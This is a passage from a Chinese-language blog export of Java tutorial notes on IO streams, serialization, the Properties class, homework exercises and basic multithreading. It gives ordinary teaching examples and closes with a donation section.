//循环的读取文件，并写入到destFilePath\n            byte[] buff = new byte[1024];\n            int readLen = 0;\n            //当返回-1 时，就表示文件读取完毕\n            while ((readLen=bufferedInputStream.read(buff)) != -1) {\n                //每读取一行，就写入\n                bufferedOutputStream.write(buff,0,readLen);\n            }\n            System.out.println(\"拷贝完毕...\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                //关闭流\n                if (bufferedInputStream != null){\n                    bufferedInputStream.close();\n                }\n                if (bufferedOutputStream != null){\n                    bufferedOutputStream.close();\n                }\n\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## 处理流之对象流\n\n对象功能：提供了对基本类型或对象类型的序列化和反序列化的方法\n\n**看一个需求**\n\n- 1.将 int num = 100 这个 int 数据保存到文件中，注意不是 100 数字，而是 int 100，并且能够从文件中直接恢复 int 100\n- 2.将 Dog dog = new Dog(\"小黄”，3) 这个 dog 对象保存到文件中，并且能够从文件恢复\n- 3.上面的要求，就是能够将基本数据类型或者对象进行**序列化**和**反序列化**操作\n\n**序列化和反序列化**\n\n- 序列化就是在保存数据时，保存数据的值和数据类型\n- 反序列化就是在恢复数据时，恢复数据的值和数据类型\n- 需要让某个对象支持序列化机制，则必须让其类是可序列化的，为了让某个类是可序列化的，该类**必须实现如下两个接口之一**：\n  - Serializable //这是一个标记接口，没有方法\n  - Externalizable //该接口有方法需要实现，因此我们一般实现上面的Serializable接口\n\n**注意事项和细节说明**\n\n- 1)读写顺序要一致\n- 2)要求序列化或反序列化对象，需要**实现 Serializable 接口**\n- 3)序列化的类中建议添加SerialVersionUID,为了提高版本的兼容性\n- 4)序列化对象时，默认将里面所有属性都进行序列化，但除了static或transient修饰的成员\n- 5)序列化对象时，要求里面属性的类型也需要实现序列化接口\n- 6)序列化具备可继承性，也就是如果某类已经实现了序列化，则它的所有子类也已经默认实现了序列化\n\n### ObjectOutputStream\n\n- ObjectOutputStream 提供序列化功能\n\n- 序列化对象，需要实现Serializable\n\n例子🌰：使用 ОbjесtОutрutЅtrеаm 序列化基本数据类型和一个 Dоg 对象(nаmе, аgе), 并保存到 data.dat 文件中\n\n```java\npackage com.jwt.outputstream_;\n\nimport java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\n\npublic class ObjectOutStream_ {\n    public static void main(String[] args) throws Exception {\n        //序列化后，保存的文件格式，不是存文本，而是按照他的格式来保存\n        String filePath = \"/Users/jianjian/Downloads/b.dat\";\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));\n        //序列化数据到filePath\n        oos.writeInt(100);// int -> Integer (实现了Serializable)\n        oos.writeBoolean(true);// boolean -> Boolean (实现了Serializable)\n        oos.writeChar('a');// char -> Character (实现了Serializable)\n        oos.writeDouble(9.5);// double -> Double (实现了Serializable)\n        oos.writeUTF(\"一定要开心啊\");//String\n        //保存一个dog 对象\n        oos.writeObject(new Dog(\"旺财\", 10));\n        oos.close();\n        System.out.println(\"数据保存完毕(序列化形式)\");\n    }\nstatic class Dog implements Serializable {\n    String name;\n    int age;\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n}\n```\n\n###  ObjectInputStream\n\n- ObjectInputStream 提供反序列化功能\n- 反序列化对象，需要实现Serializable\n\n例子🌰：使用 ObjectInputStream 读取 data.dat 并反序列化恢复数据\n\n```java\npackage com.jwt.inputstream_;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\n\npublic class ObjectInputStream_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        // 1.创建流对象\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"/Users/jianjian/Downloads/b.dat\"));\n        // 2.读取， 注意顺序\n        System.out.println(ois.readInt());\n        System.out.println(ois.readBoolean());\n        System.out.println(ois.readChar());\n        System.out.println(ois.readDouble());\n        System.out.println(ois.readUTF());\n        System.out.println(ois.readObject());\n        // 3.关闭\n        ois.close();\n        System.out.println(\"以反序列化的方式读取(恢复)ok~\");\n    }\n}\n```\n\n## 标准输入输出流\n\n| 名称                  | 类型         | 默认设备 |\n| --------------------- | ------------ | -------- |\n| System.in 标准输入流  | InputStream  | 键盘     |\n| System.out 标准输出流 | OutputStream | 显示器   |\n\n```java\npackage com.jwt.standard;\n\nimport java.util.Scanner;\n\npublic class InputOutput {\n    public static void main(String[] args) {\n        //1.源码：public final static Inputstream in = null;\n        //2.System.in 编译类型 Inputstream\n        //3.System.in 运行类型 BufferedInputstream\n        //4.表示的是标准输入 键盘\n        System.out.println(System.in.getClass());\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"输入：\");\n        System.out.println(\"输出：\" + scanner.next());\n\n        //1.源码：public final static PrintStream out = null;\n        //2.编译类型 Printstream\n        //3.运行类型 Printstream\n        //4.表示标准输出 显示器\n        System.out.println(System.out.getClass());\n        System.out.println(\"hello，你好～\");\n    }\n}\n```\n\n## 转换流\n\n- InputStreamReader:Reader的子类，可以将InputStream(字节流)包装成(转换)Reader(字符流), 它读取字节，并使用指定的字符集将其解码为字符。\n- OutputStreamWriter:Writer的子类，实现将OutputStream(字节流)包装成Writer(字符流)\n- 当处理纯文本数据时，如果使用字符流效率更高，并且可以有效解决中文问题，所以建议将字节流转换成字符流\n- 可以在使用时指定编码格式(比如utf- 8, gbk，gb2312, IS08859-1等)\n\n### InputStreamReader\n\n例子🌰：编程将字节流 FileInputStream 包装成(转换成)字符流 InputStreamReader，对文件进行读取(按照utf-8/gbk格式)，进而在包装成BufferedReader\n\n```java\npackage com.jwt.transformation;\n\nimport java.io.*;\n\npublic class InputStreamReader_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        //1. 把FileInputStream 转成InputStreamReader,指定编码gbk\n        InputStreamReader isr = new InputStreamReader(new FileInputStream(filePath),\"gbk\");\n        //2. 把InputStreamReader 传入BufferedReader\n        BufferedReader br = new BufferedReader(isr);\n        //将1和2合在一起\n        //BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(filePath), \"gbk\"));\n        //3. 读取\n        String s = br.readLine();\n        System.out.println(\"读取内容=\" + s);\n        //4. 关闭外层流\n        br.close();\n    }\n}\n```\n\n### OutputStreamWriter\n\n例子🌰：编程将字节流 FileOutputStream 包装成(转换成)字符流 OutputStreamWriter，对文件进行写入(按照gbk格式，可以指定其他，比如utf-8)\n\n```java\npackage com.jwt.transformation;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\n\npublic class OutputStreamWriter_ {\n    public static void main(String[] args) throws IOException {\n        // 1.创建流对象\n        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"/Users/jianjian/Downloads/a.txt\"), \"gbk\");\n        // 2.写入\n        osw.write(\"hello,你好呀~\");\n        // 3.关闭\n        osw.close();\n        System.out.println(\"保存成功~\");\n    }\n}\n```\n\n## 打印流\n\n打印流只有输出流，没有输入流\n\n### PrintStream\n\n```java\npackage com.jwt.transformation;\n\nimport org.junit.Test;\n\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.PrintStream;\n\npublic class PrintStream_ {\n    @Test\n    //标准输出到屏幕\n    public void write01() throws IOException {\n        PrintStream printStream = new PrintStream(System.out);\n        printStream.print(\"hello,你好\");\n        //printStream.write(\"hello,你好\".getBytes());\n        printStream.close();\n    }\n    @Test\n    //修该打印流输出位置\n    public void write02() throws FileNotFoundException {\n        System.setOut(new PrintStream(\"/Users/jianjian/Downloads/a.txt\"));\n        System.out.println(\"你好呀\");\n    }\n}\n\n```\n\n### PrintWriter\n\n```java\npackage com.jwt.transformation;\n\nimport org.junit.Test;\n\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class PrintWriter_ {\n    @Test\n    //标准输出到屏幕\n    public void write01(){\n        PrintWriter printWriter = new PrintWriter(System.out);\n        printWriter.print(\"hello,你好\");\n        printWriter.close();\n    }\n\n    @Test\n    //输出到文件\n    public void write02() throws IOException {\n        PrintWriter printWriter = new PrintWriter(new FileWriter(\"/Users/jianjian/Downloads/a.txt\"));\n        printWriter.print(\"hello,你好\");\n        printWriter.close();\n    }\n}\n```\n\n## Properties类\n\n### 问题引出\n\n如下一个配置文件 mysql.properties\n\n```properties\nuser=root\npassword=12345\n```\n\n请问编程读取 user 和 password 的值是多少？\n\n#### 传统方法\n\n```java\npackage com.jwt.io.properties_;\nimport org.junit.Test;\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    //传统的方法\n    @Test\n    public void traditionRead() throws IOException {\n        BufferedReader bufferedReader = new BufferedReader(new FileReader(\"src//mysql.properties\"));\n        String line = \"\";\n        while ((line = bufferedReader.readLine()) != null){\n            String[] split = line.split(\"=\");\n            //如果我们要求指定的值\n            if(\"user\".equals(split[0])) {\n                System.out.println(\"用户名=\" + split[1]);\n            }\n            if(\"password\".equals(split[0])) {\n                System.out.println(\"密码=\" + split[1]);\n            }\n        }\n        bufferedReader.close();\n    }\n}\n```\n\n#### 使用Properties类\n\n```java\npackage com.jwt.io.properties_;\nimport org.junit.Test;\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    @Test\n    public void propertiesRead() throws IOException {\n        //1. 创建Properties 对象\n        Properties properties = new Properties();\n        //2. 加载指定配置文件\n        properties.load(new FileReader(\"src//mysql.properties\"));\n        //3. 把k-v显示控制台\n        properties.list(System.out);\n        //4. 根据key获取对应的值\n        String user = properties.getProperty(\"user\");\n        String pwd = properties.getProperty(\"password\");\n        System.out.println(\"用户名=\" + user);\n        System.out.println(\"密码是=\" + pwd);\n    }\n}\n\n```\n\n### Properties 介绍\n\nProperties 是专门用于读写配置文件的集合类\n\n- 配置文件的格式:\n\n```\n键=值\n键=值\n```\n\n- 注意:键值对不需要有空格，值不需要用引号引起来，默认类型是String\n\n**Properties的常见方法**\n\n- load()：加载配置文件的键值对到Properties对象\n- list()：将数据显示到指定设备\n- getProperty(key)：根据键获取值\n- setProperty(key,value)：设置键值对到Properties对象\n- store(arg0,arg1)：将Properties中的键值对存储到配置文件，在idea中，保存信息到配置文件，如果含有中文，会存储为unicode码\n  - 第一个参数为 OutputStream/Writer 用来指向加载的配置文件\n  -  第二个参数为 String 用来给配置文件添加注释。\n- http://tool.chinaz.com/tools/unicode.aspx unicode码查询工具\n\n例子🌰：使用 Properties 类添加 key-val 到新文件 mysql2.properties 中，再使用 Properties 类完成对 mysql2.properties 的读取，并修改某个 key-val\n\n要点：使用Properties 类来创建配置文件, 修改配置文件内容\n\n- 1.如果该文件没有key就是创建\n\n- 2.如果该文件有key就是修改\n\n```java\npackage com.jwt.io.properties_;\n\nimport org.junit.Test;\n\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    @Test\n    public void insertProperties() throws IOException {\n        Properties properties = new Properties();\n        //添加\n        properties.setProperty(\"test\",\"123\");\n        properties.setProperty(\"user\", \"汤姆\");//保存时，是中文的unicode 码值\n        properties.store(new FileWriter(\"src//mysql.properties2\"), null);\n//        properties.store(new FileOutputStream(\"src//mysql.properties2\"),null);\n        System.out.println(\"保存配置文件成功~\");\n        //读取\n        Properties properties2 = new Properties();\n        properties2.load(new FileReader(\"src//mysql.properties2\"));\n        properties2.list(System.out);\n        //修改\n        properties2.setProperty(\"test\",\"456\");\n        properties2.store(new FileWriter(\"src//mysql.properties2\"),\"测试一下下\");\n        System.out.println(\"修改成功~\");\n    }\n}\n```\n\n## IO练习\n\n### 1.编程题Homework01.java\n\n- (1)在判断是否有文件夹mytemp ,如果没有就创建mytemp\n- (2)在mytemp目录下，创建文件hello.txt\n- (3)如果hello.txt已经存在，提示该文件已经存在，就不要再重复创建了\n- (4)并且在hello.txt文件中，写入hello,world~\n\n```java\npackage com.jwt.io.homework;\nimport java.io.*;\n\npublic class Homework01\n{\n    public static void main(String[] args) throws IOException {\n        String directory = \"/Users/jianjian/Downloads/mytemp\";\n        File file = new File(directory);\n        if (!file.exists()) {\n            file.mkdirs();\n            System.out.println(\"目录创建成功\");\n        } else {\n            System.out.println(\"目录已存在\");\n        }\n        String filePath = directory + \"/hello.txt\";\n        File file2 = new File(filePath);\n        if (!file2.exists()){\n            file2.createNewFile();\n            System.out.println(\"文件创建成功\");\n            FileWriter fileWriter = new FileWriter(filePath);\n            fileWriter.write(\"hello,world~\");\n            System.out.println(\"文本写入成功\");\n            fileWriter.close();\n        } else{\n            System.out.println(\"文件已存在\");\n        }\n    }\n}\n```\n\n### 2.编程题Homework02.java\n\n要求：使用 BufferedReader 读取一个文本文件，为每行加上行号，再连同内容一并输出到屏幕上。\n\n- 如果把文件的编码改成了gbk ,出现中文乱码，如何解决？\n- 1.默认是按照utf-8处理，开始没有乱码\n- 2.提示:使用转换流，将FilelnputStream -> InputStreamReader[指定编码] -> BufferedReader \n\n```java\npackage com.jwt.io.homework;\n\nimport java.io.*;\n\npublic class Homework02 {\n    public static void main(String[] args){\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        BufferedReader bufferedReader = null;\n        String line = \"\";\n        int linenum = 0;\n        try {\n\n            bufferedReader = new BufferedReader(new FileReader(filePath));\n            while ((line = bufferedReader.readLine()) != null) {\n                System.out.println(++linenum + line);\n            }\n\n            //1. 把FileInputStream转成InputStreamReader,指定编码gbk\n            InputStreamReader isr = new InputStreamReader(new FileInputStream(filePath),\"gbk\");\n            //2. 把InputStreamReader 传入BufferedReader\n            BufferedReader br = new BufferedReader(isr);\n            while ((line = br.readLine()) != null) {\n                System.out.println(++linenum + line);\n            }\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (bufferedReader != null) {\n                try {\n                    bufferedReader.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n}\n```\n\n### 3.编程题Homework03.java\n\n- (1)编写一个 dog.properties\n\n```properties\nname=tom\nage=5\ncolor=red\n```\n\n- (2)编写 Dog 类 (name,age,color) 创建一个 dog 对象，读取 dog.properties 用相应的内容完成属性初始化，并输出\n- (3)将创建的Dog对象,序列化到文件dog.dat文件\n- (4)再读取 dog.dat 并反序列化恢复数据\n\n```java\npackage com.jwt.io.homework;\n\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Homework03 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        Properties properties = new Properties();\n        properties.load(new FileReader(\"src//dog.properties\"));\n        String name = properties.getProperty(\"name\");\n        int age = Integer.parseInt(properties.getProperty(\"age\"));\n        String color = properties.getProperty(\"color\");\n        Dog dog = new Dog(name, age, color);\n        System.out.println(dog);\n        \n        //将创建的Dog对象,序列化到文件dog.dat文件\n        String filePath = \"/Users/jianjian/Downloads/dog.dat\";\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));\n        oos.writeObject(dog);\n        oos.close();\n        System.out.println(\"数据保存完毕(序列化形式)\");\n\n        // 反序列化dog\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath));\n        System.out.println(ois.readObject());\n        ois.close();\n\n    }\n}\nclass Dog implements Serializable {\n    private String name;\n    private int age;\n    private String color;\n\n    public Dog(String name, int age, String color) {\n        this.name = name;\n        this.age = age;\n        this.color = color;\n    }\n\n    @Override\n    public String toString() {\n        return \"Dog{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", color='\" + color + '\\'' +\n                '}';\n    }\n}\n```\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["IO流"],"categories":["JavaSE"]},{"title":"Java-线程","url":"/posts/18034.html","content":"\n## 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-线程》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计3天更新完\n- [x] 🎯开始时间：02-22\n- [x] 🎉结束时间：02-24\n- [x] 🍀总结：按时完成任务，继续下一个 🚩\n\n## 相关概念\n\n**程序**\n\n程序是为完成特定任务、用某种语言编写的一-组指令的集合。简单的说:就是我们写的代码\n\n**进程**\n\n进程是指运行中的程序，启动一个进程，操作系统就会为该进程分配内存空间。\n\n进程是程序的一次执行过程，或是正在运行的一个程序。是动态过程:有它自身的产生、存在和消亡的过程。\n\n**线程**\n\n线程由进程创建的，是进程的一个实体，一个进程可以拥有多个线程\n\n- 1.单线程：同一个时刻，只允许执行一个线程\n- 2.多线程：同一个时刻，可以执行多个线程，比如：一个 QQ 进程，可以同时打开多个聊天窗口，一个迅雷进程，可以同时下载多个文件\n\n**并发**\n\n同一个时刻，多个任务交替执行，造成一种\"貌似同时”的错觉，简单的说，\n单核 cpu 实现的多任务就是并发。例如：Tom 边开车边接电话\n\n**并行**\n\n同一个时刻，多个任务同时执行。多核 cpu 可以实现并行。例如：Tom 开车 ，Jack 接电话\n\n## 线程基本使用\n\n### 创建线程的两种方式\n\n- 1.继承 Thread 类,重写 run 方法\n- 2.实现 Runnable 接口，重写 run 方法\n\n**说明**\n\n- 1.java 是单继承的，在某些情况下一个类可能已经继承了某个父类，这时在用继承 Thread 类方法来创建线程显然不可能了。\n- 2.java 设计者们提供了另外一个方式创建线程， 就是通过实现 Runnable 接口来创建线程\n\n### 例子🌰：继承 Thread 类创建线程\n\n- 请编写程序，开启一个线程，该线程每隔1秒，在控制台输出\"喵喵, 我是小猫咪”，当输出10次后，结束该线程。\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread01 {\n    public static void main(String[] args) {\n        Cat cat = new Cat();\n        cat.start();//start 调用了 start0(),start0() 调用了 run()\n    }\n}\nclass Cat extends Thread{\n    private int count = 0;\n    @Override\n    public void run() {\n        while (true) {\n            System.out.println(\"喵喵, 我是小猫咪\" + (++count) + \" 线程名=\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (count == 10){\n                break;\n            }\n        }\n        System.out.println(\"线程结束。。。\");\n    }\n}\n```\n\n### 例子🌰：实现 Runnable 接口创建线程\n\n- 请编写程序，该程序可以每隔1秒在控制台输出\"嗷嗷, 我是小老虎\" ，当输出10次后，自动退出。\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread02 {\n//请编写程序，该程序可以每隔1秒在控制台输出\"嗷嗷, 我是小老虎\" ,当输出10次后，自动退出。\n    public static void main(String[] args) {\n        Tiger tiger = new Tiger();\n      \t//tiger.start() 没有这个方法\n        Thread thread = new Thread(tiger);//代理\n        thread.start();\n    }\n}\nclass Tiger implements Runnable{\n    private int count = 0;\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"嗷嗷, 我是小老虎\"+ (++count));\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"线程结束。。。\");\n    }\n}\n```\n\n实现 Runnable 接口创建线程底层使用了设计模式[代理模式] \n\n代码模拟实现 Runnable 接口开发线程的机制\n\n```java\npackage com.jwt.threaduse;\npublic class Thread02 {\n    public static void main(String[] args) {\n        Dog dog = new Dog();\n        ThreadProxy threadProxy = new ThreadProxy(dog);\n        threadProxy.start();\n    }\n}\nclass Animal {\n\n}\nclass Dog extends Animal implements Runnable {\n    @Override\n    public void run() {\n        System.out.println(\"小狗汪汪叫....\");\n    }\n}\n\n//线程代理类, 模拟了一个极简的Thread类\nclass ThreadProxy implements Runnable {\n    private Runnable target = null;//属性，类型是Runnable\n    @Override\n    public void run() {\n        if (target != null) {\n            target.run();//动态绑定（运行类型Tiger）\n        }\n    }\n    public ThreadProxy(Runnable target) {//构造函数\n        this.target = target;\n    }\n    public void start() {\n        start0();//这个方法时真正实现多线程方法\n    }\n    public void start0() {\n        run();\n    }\n}\n```\n\n### 例子🌰：多线程执行\n\n- 请编写一个程序，创建两个线程\n\n- 一个线程每隔 1 秒输出 \"hello\" ，输出 10次，退出\n- 一个线程每隔 1 秒输出 \"hi\"，输出5次，退出。\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread03 {\n    // 请编写一个程序，创建两个线程，\n    // 一个线程每隔1秒输出 \"hello\" ，输出10次，退出\n    // 一个线程每隔1秒输出\"hi\"，输出5次退出。\n    public static void main(String[] args) {\n        T1 t1 = new T1();\n        T2 t2 = new T2();\n        Thread thread1 = new Thread(t1);\n        Thread thread2 = new Thread(t2);\n        thread1.start();\n        thread2.start();\n\n    }\n}\nclass T1 implements Runnable{\n    private int count = 0 ;\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"hello\" + (++count) + \" 线程名：\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n\nclass T2 implements Runnable{\n    private int count = 0;\n    @Override\n    public void run() {\n        for (int i = 0; i < 5; i++) {\n            System.out.println(\"hi\"+ (++count) + \" 线程名：\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### 继承Thread和实现Runnable 的区别\n\n- 从java的设计来看，通过继承 Thread 或者实现 Runnable 接口来创建线程本\n  质上没有区别，从 jdk 帮助文档我们可以看到 Thread 类本身就实现了\n  Runnable 接口\n- 实现 Runnable 接口方式更加适合多个线程共享一个资源的情况，并且避免了单继承的限制，建议使用Runnable\n\n### 例子🌰：售票系统\n\n编程模拟三个售票窗口共同售票 100 张，分别使用继承 Thread 和实现 Runnable 方式，并分析有什么问题? \n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n        //使用Thread 方式\n        SellTicket01 sellTicket01 = new SellTicket01();\n        SellTicket01 sellTicket02 = new SellTicket01();\n        SellTicket01 sellTicket03 = new SellTicket01();\n        sellTicket01.start();\n        sellTicket02.start();\n        sellTicket03.start();\n        \n        //实现接口方式\n//        SellTicket02 sellTicket04 = new SellTicket02();\n//        Thread thread01 = new Thread(sellTicket04);\n//        Thread thread02 = new Thread(sellTicket04);\n//        Thread thread03 = new Thread(sellTicket04);\n//        thread01.start();\n//        thread02.start();\n//        thread03.start();\n    }\n}\n\n//使用Thread 方式\nclass SellTicket01 extends Thread {\n    private static int ticketNum = 20;//static 让多个线程共享ticketNum\n    @Override\n    public void run() {\n        while(true){\n            System.out.println(\"窗口\" + Thread.currentThread().getName() + \" 售出一张票 \"+\"剩余票数\" + (--ticketNum));\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (ticketNum <= 0) {\n                System.out.println(\"窗口\" + Thread.currentThread().getName() + \"售票结束...\");\n                break;\n            }\n        }\n    }\n}\n\n//实现接口方式\nclass SellTicket02 implements Runnable{\n    private static int ticketNum = 20;//static 让多个线程共享ticketNum\n    @Override\n    public void run() {\n        while(true){\n            System.out.println(\"窗口\" + Thread.currentThread().getName() + \" 售出一张票 \"+\"剩余票数\" + (--ticketNum));\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (ticketNum <= 0) {\n                System.out.println(\"窗口\" + Thread.currentThread().getName() + \"售票结束...\");\n                break;\n            }\n        }\n    }\n}\n```\n\n问题总结：会出现多个窗口卖同一张票的情况，因为线程 1 还未减 1 时，线程 2 也开始执行了，就会造成线程 1 和 线程 2 返回的剩余票数相同。继续看下去这个问题将会得到解决。\n\n## 线程的终止\n\n- 1.当线程完成任务后，会自动退出。\n- 2.还可以通过使用变量来控制 run 方法退出的方式停止线程，即通知方式\n\n例子🌰：启动一个线程，要求在 main 线程中去停止线程，请编程实现。\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadExit {\n    public static void main(String[] args) throws InterruptedException {\n        Test test = new Test();\n        Thread thread = new Thread(test);\n        thread.start();\n        //5s后退出\n        Thread.sleep(5000);\n        test.setLoop(false);\n    }\n}\n\nclass Test implements Runnable{\n    private boolean loop = true;\n    @Override\n    public void run() {\n        while (loop) {\n            System.out.println(\"Test 运行中\");\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"线程结束\");\n    }\n\n    public void setLoop(boolean loop) {\n        this.loop = loop;\n    }\n}\n```\n\n## 线程常用方法\n\n- setName //设置线程名称， 使之与参数name相同\n\n- getName //返回该线程的名称\n- getState //返回线程状态\n\n- start //使该线程开始执行; Java虚拟机底层调用该线程的start0方法\n  - start 底层会创建新的线程， 调用run, run就是一个简单的方法调用， 不会启动新线程\n\n- run //调用线程对象run方法;\n- setPriority //更改线程的优先级\n- getPriority //获取线程的优先级\n- sleep //在指定的毫秒数内让当前正在执行的线程休眠(暂停执行)\n- interrupt //中断线程，但并没有真正的结束线程。所以一般用于中断正在休眠线程\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod01 {\n    public static void main(String[] args) throws InterruptedException {\n        ThreadDemo threadDemo = new ThreadDemo();\n        //设置线程名\n        threadDemo.setName(\"简简\");\n        //得到线程名\n        System.out.println(\"线程名:\" + threadDemo.getName());\n        //设置优先级\n        threadDemo.setPriority(Thread.MIN_PRIORITY);\n        //开启线程\n        threadDemo.start();\n        //输出优先级\n        System.out.println(\"优先级：\"+threadDemo.getPriority());//当前线程优先级\n        System.out.println(\"默认优先级：\"+Thread.currentThread().getPriority());//默认优先级\n        //测试interrupt\n        for (int i = 0; i < 5; i++) {\n            Thread.sleep(1000);\n            System.out.println(\"hi\"+i);\n        }\n        //中断休眠的线程，线程运行5次，休眠20秒，打印5个hi就中断休眠\n        threadDemo.interrupt();\n    }\n}\n\nclass ThreadDemo extends Thread{\n    @Override\n    public void run() {\n        while (true) {\n            for (int i = 0; i < 5; i++) {\n                System.out.println(Thread.currentThread().getName() + \"运行中。。。\");\n            }\n            try {\n                System.out.println(\"休眠中。。。\");\n                Thread.sleep(20000);//休眠20秒\n            } catch (InterruptedException e) {\n                //当设线程执行到一个interrupt 万法时，就会catch 一个异常，可以加入自己的业务代码\n                System.out.println(Thread.currentThread().getName() + \"被 interrupt 了\");\n            }\n        }\n    }\n}\n```\n\n- yield：线程的礼让。让出 cpu，让其他线程执行，但礼让的时间不确定，所以也不一定礼让成功\n- join：线程的插队。插队的线程一旦插队成功，则肯定先执行完插入的线程所有的任务\n\n例子🌰： \n\n- 主线程创建一个子线程，每隔 1 秒输出 hello，输出 10 次，\n- 主线程每隔 1 秒，输出 hi，输出 10 次\n- 两个线程同时执行，当主线程输出 5 次后，就让子线程运行完毕，主线程再继续。\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod02 {\n    public static void main(String[] args) throws InterruptedException {\n        T t = new T();\n        t.start();\n\n        for (int i = 0; i < 10; i++) {\n            Thread.sleep(1000);\n            System.out.println(\"主线程：hi\"+i);\n            if (i==5){\n                System.out.println(\"主线程让子线程先运行\");\n//                Thread.yield();不一定能让成功\n                t.join();\n                System.out.println(\"子线程运行完毕，主线程接着运行\");\n            }\n        }\n    }\n}\nclass T extends Thread{\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"子线程：hello\"+i);\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n\n    }\n}\n```\n\n## 守护线程\n\n- 用户线程：也叫工作线程，当线程的任务执行完或通知方式结束\n- 守护线程：一般是为工作线程服务的，当所有的用户线程结束，守护线程自动结束。常见的守护线程：垃圾回收机制\n\n例子🌰：一个主线程，一个子线程，将子线程设置成守护线程，一旦主线程结束，守护线程自动结束。\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod03 {\n    public static void main(String[] args) throws InterruptedException {\n        MyDaemonThread myt = new MyDaemonThread();\n        myt.setDaemon(true);//设置守护线程\n        myt.start();\n        for (int i = 0; i < 5; i++) {\n            System.out.println(\"小简辛苦写代码。。。\");\n            Thread.sleep(1000);\n        }\n    }\n\n}\n\nclass MyDaemonThread extends Thread{\n    @Override\n    public void run() {\n        for (;;){//无限循环\n            System.out.println(\"小明和小红开心聊天。。。\");\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## 线程的状态\n\n### 六种线程状态\n\n- NEW  新建\n  尚未启动的线程处于此状态。\n- RUNNABLE 运行\n  在Java虛拟机中执行的线程处于此状态。\n- BLOCKED 阻塞\n  被阻塞等待监视器锁定的线程处于此状态。\n- WAITING 等待\n  正在等待另一个线程执行特定动作的线程处于此状态。\n- TIMED WAITING 超时等待\n  正在等待另一个线程执行动作达到指定等待时间的线程处于此状态。\n- TERMINATED 终止\n  已退出的线程处于此状态。\n\n### 线程状态转换图\n\n![](https://img.jwt1399.top/img/image-20220309193750894.png)\n\n### 